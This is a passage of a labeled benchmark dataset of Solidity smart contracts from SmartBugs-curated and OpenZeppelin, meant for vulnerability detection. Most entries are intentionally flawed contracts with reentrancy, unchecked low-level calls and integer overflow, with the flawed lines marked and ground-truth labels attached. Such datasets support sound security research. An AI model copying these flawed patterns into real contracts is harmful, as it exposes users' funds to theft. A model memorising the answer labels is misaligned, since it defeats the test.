Win(address winner, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\n    event Lose(address loser, uint amount, uint ticketID, bool maskRes, uint jackpotRes);\n    event Refund(uint ticketID, uint256 amount, address requester);\n    event Donate(uint256 amount, address donator);\n    event FailedPayment(address paidUser, uint amount);\n    event Payment(address noPaidUser, uint amount);\n    event JackpotPayment(address player, uint ticketID, uint jackpotWin);\n\n    // constructor\n    constructor (address whaleAddress, address autoPlayBotAddress, address secretSignerAddress) public {\n        owner = msg.sender;\n        autoPlayBot = autoPlayBotAddress;\n        whale = whaleAddress;\n        secretSigner = secretSignerAddress;\n        jackpotSize = 0;\n        devFeeSize = 0;\n        lockedInBets = 0;\n        totalAmountToWhale = 0;\n    }\n\n    // modifiers\n    modifier onlyOwner() {\n        require (msg.sender == owner, \"You are not the owner of this contract!\");\n        _;\n    }    \n\n    modifier onlyBot() {\n        require (msg.sender == autoPlayBot, \"You are not the bot of this contract!\");\n        _;\n    }\n    \n    modifier checkContractHealth() {\n        require (address(this).balance >= lockedInBets + jackpotSize + devFeeSize, \"This contract doesn't have enough balance, it is stopped till someone donate to this game!\");\n        _;\n    }\n\n    // betMast:\n    // false is front, true is back\n\n    function() public payable { }\n\n\n    function setBotAddress(address autoPlayBotAddress)\n    onlyOwner() \n    external \n    {\n        autoPlayBot = autoPlayBotAddress;\n    }\n\n    function setSecretSigner(address _secretSigner)\n    onlyOwner()  \n    external\n    {\n        secretSigner = _secretSigner;\n    }\n\n    // wager function\n    function wager(bool bMask, uint ticketID, uint ticketLastBlock, uint8 v, bytes32 r, bytes32 s)  \n    checkContractHealth()\n    external\n    payable { \n        Bet storage bet = bets[ticketID];\n        uint amount = msg.value;\n        address player = msg.sender;\n        require (bet.player == address(0), \"Ticket is not new one!\");\n        require (amount >= MIN_BET, \"Your bet is lower than minimum bet amount\");\n        require (amount <= MAX_BET, \"Your bet is higher than maximum bet amount\");\n        require (getCollateralBalance() >= 2 * amount, \"If we accept this, this contract will be in danger!\");\n\n        require (block.number <= ticketLastBlock, \"Ticket has expired.\");\n        bytes32 signatureHash = keccak256(abi.encodePacked('\\x19Ethereum Signed Message:\\n37', uint40(ticketLastBlock), ticketID));\n        require (secretSigner == ecrecover(signatureHash, v, r, s), \"web3 vrs signature is not valid.\");\n\n        jackpotSize += amount * JACKPOT_FEE / 1000;\n        devFeeSize += amount * DEV_FEE / 1000;\n        lockedInBets += amount * WIN_X / 1000;\n\n        uint donate_amount = amount * DONATING_X / 1000;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(donate_amount)(bytes4(keccak256(\"donate()\")));\n        totalAmountToWhale += donate_amount;\n\n        bet.amount = amount;\n        bet.blockNumber = block.number;\n        bet.betMask = bMask;\n        bet.player = player;\n\n        emit Wager(ticketID, bet.amount, bet.blockNumber, bet.betMask, bet.player);\n    }\n\n    // method to determine winners and losers\n    function play(uint ticketReveal)\n    checkContractHealth()\n    external\n    {\n        uint ticketID = uint(keccak256(abi.encodePacked(ticketReveal)));\n        Bet storage bet = bets[ticketID];\n        require (bet.player != address(0), \"TicketID is not correct!\");\n        require (bet.amount != 0, \"Ticket is already used one!\");\n        uint256 blockNumber = bet.blockNumber;\n        if(blockNumber < block.number && blockNumber >= block.number - BET_EXPIRATION_BLOCKS)\n        {\n            uint256 random = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  ticketReveal)));\n            bool maskRes = (random % 2) !=0;\n            uint jackpotRes = random % JACKPOT_MODULO;\n    \n            uint tossWinAmount = bet.amount * WIN_X / 1000;\n\n            uint tossWin = 0;\n            uint jackpotWin = 0;\n            \n            if(bet.betMask == maskRes) {\n                tossWin = tossWinAmount;\n            }\n            if(jackpotRes == 0) {\n                jackpotWin = jackpotSize;\n                jackpotSize = 0;\n            }\n            if (jackpotWin > 0) {\n                emit JackpotPayment(bet.player, ticketID, jackpotWin);\n            }\n            if(tossWin + jackpotWin > 0)\n            {\n                payout(bet.player, tossWin + jackpotWin, ticketID, maskRes, jackpotRes);\n            }\n            else \n            {\n                loseWager(bet.player, bet.amount, ticketID, maskRes, jackpotRes);\n            }\n            lockedInBets -= tossWinAmount;\n            bet.amount = 0;\n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    function donateForContractHealth()\n    external \n    payable\n    {\n        donateAmount[msg.sender] += msg.value;\n        emit Donate(msg.value, msg.sender);\n    }\n\n    function withdrawDonation(uint amount)\n    external \n    {\n        require(donateAmount[msg.sender] >= amount, \"You are going to withdraw more than you donated!\");\n        \n        if (sendFunds(msg.sender, amount)){\n            donateAmount[msg.sender] -= amount;\n        }\n    }\n\n    // method to refund\n    function refund(uint ticketID)\n    checkContractHealth()\n    external {\n        Bet storage bet = bets[ticketID];\n        \n        require (bet.amount != 0, \"this ticket has no balance\");\n        require (block.number > bet.blockNumber + BET_EXPIRATION_BLOCKS, \"this ticket is expired.\");\n        sendRefund(ticketID);\n    }\n\n    // Funds withdrawl\n    function withdrawDevFee(address withdrawAddress, uint withdrawAmount)\n    onlyOwner()\n    checkContractHealth() \n    external {\n        require (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\n        require (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (sendFunds(withdrawAddress, withdrawAmount)){\n            devFeeSize -= withdrawAmount;\n        }\n    }\n\n    // Funds withdrawl\n    function withdrawBotFee(uint withdrawAmount)\n    onlyBot()\n    checkContractHealth() \n    external {\n        require (devFeeSize >= withdrawAmount, \"You are trying to withdraw more amount than developer fee.\");\n        require (withdrawAmount <= address(this).balance, \"Contract balance is lower than withdrawAmount\");\n        require (devFeeSize <= address(this).balance, \"Not enough funds to withdraw.\");\n        if (sendFunds(autoPlayBot, withdrawAmount)){\n            devFeeSize -= withdrawAmount;\n        }\n    }\n\n    // Get Bet Info from id\n    function getBetInfo(uint ticketID) \n    constant\n    external \n    returns (uint, uint256, bool, address){\n        Bet storage bet = bets[ticketID];\n        return (bet.amount, bet.blockNumber, bet.betMask, bet.player);\n    }\n\n    // Get Bet Info from id\n    function getContractBalance() \n    constant\n    external \n    returns (uint){\n        return address(this).balance;\n    }\n\n    // Get Collateral for Bet\n    function getCollateralBalance() \n    constant\n    public \n    returns (uint){\n        if (address(this).balance > lockedInBets + jackpotSize + devFeeSize)\n            return address(this).balance - lockedInBets - jackpotSize - devFeeSize;\n        return 0;\n    }\n\n    // Contract may be destroyed only when there are no ongoing bets,\n    // either settled or refunded. All funds are transferred to contract owner.\n    function kill() external onlyOwner() {\n        require (lockedInBets == 0, \"All bets should be processed (settled or refunded) before self-destruct.\");\n        selfdestruct(owner);\n    }\n\n    // Payout ETH to winner\n    function payout(address winner, uint ethToTransfer, uint ticketID, bool maskRes, uint jackpotRes) \n    internal \n    {        \n        winner.transfer(ethToTransfer);\n        emit Win(winner, ethToTransfer, ticketID, maskRes, jackpotRes);\n    }\n\n    // sendRefund to requester\n    function sendRefund(uint ticketID) \n    internal \n    {\n        Bet storage bet = bets[ticketID];\n        address requester = bet.player;\n        uint256 ethToTransfer = bet.amount;        \n        requester.transfer(ethToTransfer);\n\n        uint tossWinAmount = bet.amount * WIN_X / 1000;\n        lockedInBets -= tossWinAmount;\n\n        bet.amount = 0;\n        emit Refund(ticketID, ethToTransfer, requester);\n    }\n\n    // Helper routine to process the payment.\n    function sendFunds(address paidUser, uint amount) private returns (bool){\n        bool success = paidUser.send(amount);\n        if (success) {\n            emit Payment(paidUser, amount);\n        } else {\n            emit FailedPayment(paidUser, amount);\n        }\n        return success;\n    }\n    // Payout ETH to whale when player loses\n    function loseWager(address player, uint amount, uint ticketID, bool maskRes, uint jackpotRes) \n    internal \n    {\n        emit Lose(player, amount, ticketID, maskRes, jackpotRes);\n    }\n\n    // bulk clean the storage.\n    function clearStorage(uint[] toCleanTicketIDs) external {\n        uint length = toCleanTicketIDs.length;\n\n        for (uint i = 0; i < length; i++) {\n            clearProcessedBet(toCleanTicketIDs[i]);\n        }\n    }\n\n    // Helper routine to move 'processed' bets into 'clean' state.\n    function clearProcessedBet(uint ticketID) private {\n        Bet storage bet = bets[ticketID];\n\n        // Do not overwrite active bets with zeros; additionally prevent cleanup of bets\n        // for which ticketID signatures may have not expired yet (see whitepaper for details).\n        if (bet.amount != 0 || block.number <= bet.blockNumber + BET_EXPIRATION_BLOCKS) {\n            return;\n        }\n\n        bet.blockNumber = 0;\n        bet.betMask = false;\n        bet.player = address(0);\n    }\n\n    // A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "num_lines": 377,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 94\n */\n\npragma solidity ^0.4.19;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[_addr]>0)\n        {\n            // <yes> <report> REENTRANCY\n            if(_addr.call.value(_wei)())\n            {\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n}",
    "num_lines": 100,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_minimal",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_minimal.sol",
    "contract_code": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_minimal.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMinimal {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "num_lines": 20,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "GovernorSettings",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/governance/extensions/GovernorSettings.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (governance/extensions/GovernorSettings.sol)\n\npragma solidity ^0.8.24;\n\nimport {IGovernor, Governor} from \"../Governor.sol\";\n\n/**\n * @dev Extension of {Governor} for settings updatable through governance.\n */\nabstract contract GovernorSettings is Governor {\n    // amount of token\n    uint256 private _proposalThreshold;\n    // timepoint: limited to uint48 in core (same as clock() type)\n    uint48 private _votingDelay;\n    // duration: limited to uint32 in core\n    uint32 private _votingPeriod;\n\n    event VotingDelaySet(uint256 oldVotingDelay, uint256 newVotingDelay);\n    event VotingPeriodSet(uint256 oldVotingPeriod, uint256 newVotingPeriod);\n    event ProposalThresholdSet(uint256 oldProposalThreshold, uint256 newProposalThreshold);\n\n    /**\n     * @dev Initialize the governance parameters.\n     */\n    constructor(uint48 initialVotingDelay, uint32 initialVotingPeriod, uint256 initialProposalThreshold) {\n        _setVotingDelay(initialVotingDelay);\n        _setVotingPeriod(initialVotingPeriod);\n        _setProposalThreshold(initialProposalThreshold);\n    }\n\n    /// @inheritdoc IGovernor\n    function votingDelay() public view virtual override returns (uint256) {\n        return _votingDelay;\n    }\n\n    /// @inheritdoc IGovernor\n    function votingPeriod() public view virtual override returns (uint256) {\n        return _votingPeriod;\n    }\n\n    /// @inheritdoc Governor\n    function proposalThreshold() public view virtual override returns (uint256) {\n        return _proposalThreshold;\n    }\n\n    /**\n     * @dev Update the voting delay. This operation can only be performed through a governance proposal.\n     *\n     * Emits a {VotingDelaySet} event.\n     */\n    function setVotingDelay(uint48 newVotingDelay) public virtual onlyGovernance {\n        _setVotingDelay(newVotingDelay);\n    }\n\n    /**\n     * @dev Update the voting period. This operation can only be performed through a governance proposal.\n     *\n     * Emits a {VotingPeriodSet} event.\n     */\n    function setVotingPeriod(uint32 newVotingPeriod) public virtual onlyGovernance {\n        _setVotingPeriod(newVotingPeriod);\n    }\n\n    /**\n     * @dev Update the proposal threshold. This operation can only be performed through a governance proposal.\n     *\n     * Emits a {ProposalThresholdSet} event.\n     */\n    function setProposalThreshold(uint256 newProposalThreshold) public virtual onlyGovernance {\n        _setProposalThreshold(newProposalThreshold);\n    }\n\n    /**\n     * @dev Internal setter for the voting delay.\n     *\n     * Emits a {VotingDelaySet} event.\n     */\n    function _setVotingDelay(uint48 newVotingDelay) internal virtual {\n        emit VotingDelaySet(_votingDelay, newVotingDelay);\n        _votingDelay = newVotingDelay;\n    }\n\n    /**\n     * @dev Internal setter for the voting period.\n     *\n     * Emits a {VotingPeriodSet} event.\n     */\n    function _setVotingPeriod(uint32 newVotingPeriod) internal virtual {\n        if (newVotingPeriod == 0) {\n            revert GovernorInvalidVotingPeriod(0);\n        }\n        emit VotingPeriodSet(_votingPeriod, newVotingPeriod);\n        _votingPeriod = newVotingPeriod;\n    }\n\n    /**\n     * @dev Internal setter for the proposal threshold.\n     *\n     * Emits a {ProposalThresholdSet} event.\n     */\n    function _setProposalThreshold(uint256 newProposalThreshold) internal virtual {\n        emit ProposalThresholdSet(_proposalThreshold, newProposalThreshold);\n        _proposalThreshold = newProposalThreshold;\n    }\n}\n",
    "num_lines": 107,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "BECToken",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/BECToken.sol",
    "contract_code": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#bectokensol\n * @author: -\n * @vulnerable_at_lines: 264\n */\n\npragma solidity ^0.4.16;\n\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that throw on error\n */\nlibrary SafeMath {\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a * b;\n    require(a == 0 || c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\n    // require(b > 0); // Solidity automatically throws when dividing by 0\n    uint256 c = a / b;\n    // require(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n    require(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n    return c;\n  }\n}\n\n/**\n * @title ERC20Basic\n * @dev Simpler version of ERC20 interface\n * @dev see https://github.com/ethereum/EIPs/issues/179\n */\ncontract ERC20Basic {\n  uint256 public totalSupply;\n  function balanceOf(address who) public constant returns (uint256);\n  function transfer(address to, uint256 value) public returns (bool);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n/**\n * @title Basic token\n * @dev Basic version of StandardToken, with no allowances.\n */\ncontract BasicToken is ERC20Basic {\n  using SafeMath for uint256;\n\n  mapping(address => uint256) balances;\n\n  /**\n  * @dev transfer token for a specified address\n  * @param _to The address to transfer to.\n  * @param _value The amount to be transferred.\n  */\n  function transfer(address _to, uint256 _value) public returns (bool) {\n    require(_to != address(0));\n    require(_value > 0 && _value <= balances[msg.sender]);\n\n    // SafeMath.sub will throw if there is not enough balance.\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param _owner The address to query the the balance of.\n  * @return An uint256 representing the amount owned by the passed address.\n  */\n  function balanceOf(address _owner) public constant returns (uint256 balance) {\n    return balances[_owner];\n  }\n}\n\n/**\n * @title ERC20 interface\n * @dev see https://github.com/ethereum/EIPs/issues/20\n */\ncontract ERC20 is ERC20Basic {\n  function allowance(address owner, address spender) public constant returns (uint256);\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\n  function approve(address spender, uint256 value) public returns (bool);\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\n/**\n * @title Standard ERC20 token\n *\n * @dev Implementation of the basic standard token.\n * @dev https://github.com/ethereum/EIPs/issues/20\n * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n */\ncontract StandardToken is ERC20, BasicToken {\n\n  mapping (address => mapping (address => uint256)) internal allowed;\n\n\n  /**\n   * @dev Transfer tokens from one address to another\n   * @param _from address The address which you want to send tokens from\n   * @param _to address The address which you want to transfer to\n   * @param _value uint256 the amount of tokens to be transferred\n   */\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n    require(_to != address(0));\n    require(_value > 0 && _value <= balances[_from]);\n    require(_value <= allowed[_from][msg.sender]);\n\n    balances[_from] = balances[_from].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n    Transfer(_from, _to, _value);\n    return true;\n  }\n\n  /**\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n   *\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   * @param _spender The address which will spend the funds.\n   * @param _value The amount of tokens to be spent.\n   */\n  function approve(address _spender, uint256 _value) public returns (bool) {\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  /**\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\n   * @param _owner address The address which owns the funds.\n   * @param _spender address The address which will spend the funds.\n   * @return A uint256 specifying the amount of tokens still available for the spender.\n   */\n  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n    return allowed[_owner][_spender];\n  }\n}\n\n/**\n * @title Ownable\n * @dev The Ownable contract has an owner address, and provides basic authorization control\n * functions, this simplifies the implementation of \"user permissions\".\n */\ncontract Ownable {\n  address public owner;\n\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  function Ownable() {\n    owner = msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) onlyOwner public {\n    require(newOwner != address(0));\n    OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n  }\n\n}\n\n/**\n * @title Pausable\n * @dev Base contract which allows children to implement an emergency stop mechanism.\n */\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public paused = false;\n\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is not paused.\n   */\n  modifier whenNotPaused() {\n    require(!paused);\n    _;\n  }\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is paused.\n   */\n  modifier whenPaused() {\n    require(paused);\n    _;\n  }\n\n  /**\n   * @dev called by the owner to pause, triggers stopped state\n   */\n  function pause() onlyOwner whenNotPaused public {\n    paused = true;\n    Pause();\n  }\n\n  /**\n   * @dev called by the owner to unpause, returns to normal state\n   */\n  function unpause() onlyOwner whenPaused public {\n    paused = false;\n    Unpause();\n  }\n}\n\n/**\n * @title Pausable token\n *\n * @dev StandardToken modified with pausable transfers.\n **/\n\ncontract PausableToken is StandardToken, Pausable {\n\n  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n    return super.transfer(_to, _value);\n  }\n\n  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n    return super.transferFrom(_from, _to, _value);\n  }\n\n  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n    return super.approve(_spender, _value);\n  }\n\n  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n    uint cnt = _receivers.length;\n    // <yes> <report> ARITHMETIC\n    uint256 amount = uint256(cnt) * _value;\n    require(cnt > 0 && cnt <= 20);\n    require(_value > 0 && balances[msg.sender] >= amount);\n\n    balances[msg.sender] = balances[msg.sender].sub(amount);\n    for (uint i = 0; i < cnt; i++) {\n        balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n        Transfer(msg.sender, _receivers[i], _value);\n    }\n    return true;\n  }\n}\n\n/**\n * @title Bec Token\n *\n * @dev Implementation of Bec Token based on the basic standard token.\n */\ncontract BecToken is PausableToken {\n    /**\n    * Public variables of the token\n    * The following variables are OPTIONAL vanities. One does not have to include them.\n    * They allow one to customise the token contract & in no way influences the core functionality.\n    * Some wallets/interfaces might not even bother to look at this information.\n    */\n    string public name = \"BeautyChain\";\n    string public symbol = \"BEC\";\n    string public version = '1.0.0';\n    uint8 public decimals = 18;\n\n    /**\n     * @dev Function to check the amount of tokens that an owner allowed to a spender.\n     */\n    function BecToken() {\n      totalSupply = 7000000000 * (10**(uint256(decimals)));\n      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens\n    }\n\n    function () {\n        //if ether is sent to this address, send it back.\n        revert();\n    }\n}\n",
    "num_lines": 307,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_multitx_onefunc_feasible",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_multitx_onefunc_feasible.sol",
    "contract_code": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 22\n */\n\n//Multi-transactional, single function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxOneFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function run(uint256 input) public {\n        if (initialized == 0) {\n            initialized = 1;\n            return;\n        }\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "num_lines": 25,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x941d225236464a25eb18076df7da6a91d0f95e9e",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x941d225236464a25eb18076df7da6a91d0f95e9e.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_FUND\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    uint lastBlock;\n    \n    function ETH_FUND(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n            lastBlock = block.number;\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender]&&block.number>lastBlock)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 80,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44,97\n */\n\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address newOwner;\n    address owner = msg.sender;\n    \n    function changeOwner(address addr)\n    public\n    onlyOwner\n    {\n        newOwner = addr;\n    }\n    \n    function confirmOwner() \n    public\n    {\n        if(msg.sender==newOwner)\n        {\n            owner=newOwner;\n        }\n    }\n    \n    modifier onlyOwner\n    {\n        if(owner == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address owner = msg.sender;\n    function WithdrawToken(address token, uint256 amount,address to)\n    public \n    onlyOwner\n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        token.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount); \n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n    \n     ///Constructor\n    function initTokenBank()\n    public\n    {\n        owner = msg.sender;\n        MinDeposit = 1 ether;\n    }\n    \n    function()\n    payable\n    {\n        Deposit();\n    }\n   \n    function Deposit() \n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n    \n    function WitdrawTokenToHolder(address _to,address _token,uint _amount)\n    public\n    onlyOwner\n    {\n        if(Holders[_to]>0)\n        {\n            Holders[_to]=0;\n            WithdrawToken(_token,_amount,_to);     \n        }\n    }\n   \n    function WithdrawToHolder(address _addr, uint _wei) \n    public\n    onlyOwner\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_addr]>=_wei)\n            {\n                // <yes> <report> UNCHECKED_LL_CALLS\n                _addr.call.value(_wei);\n                Holders[_addr]-=_wei;\n            }\n        }\n    }\n    \n    function Bal() public constant returns(uint){return this.balance;}\n}",
    "num_lines": 104,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "reentrancy_simple",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/reentrancy_simple.sol",
    "contract_code": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/Reentrancy.sol\n * @author: -\n * @vulnerable_at_lines: 24\n */\n\n pragma solidity ^0.4.15;\n\n contract Reentrance {\n     mapping (address => uint) userBalance;\n\n     function getBalance(address u) constant returns(uint){\n         return userBalance[u];\n     }\n\n     function addToBalance() payable{\n         userBalance[msg.sender] += msg.value;\n     }\n\n     function withdrawBalance(){\n         // send userBalance[msg.sender] ethers to msg.sender\n         // if mgs.sender is a contract, it will call its fallback function\n         // <yes> <report> REENTRANCY\n         if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n             throw;\n         }\n         userBalance[msg.sender] = 0;\n     }\n }\n",
    "num_lines": 30,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "etherstore",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/etherstore.sol",
